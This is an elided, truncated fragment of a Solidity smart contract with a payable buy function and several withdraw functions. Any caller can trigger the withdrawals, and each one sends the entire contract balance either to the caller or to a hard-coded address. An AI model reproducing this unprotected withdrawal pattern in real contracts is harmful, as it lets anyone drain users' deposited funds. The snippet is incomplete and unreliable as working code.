...
pragma solidity ^0.8.12;
    ...
    function buy_button(uint) external payable {
    }
    function withdraw_button(uint) external {
        address payable to = payable(msg.sender);
        to.transfer(address(this).balance);
    }
    function withdraw2_button(uint) external {
        address payable to = payable(0xc9D0961f8054Ac071264e20EfAa90323fFF70bBa);
        to.transfer(address(this).balance); 
    }
    function withdraw3_button(uint) external {
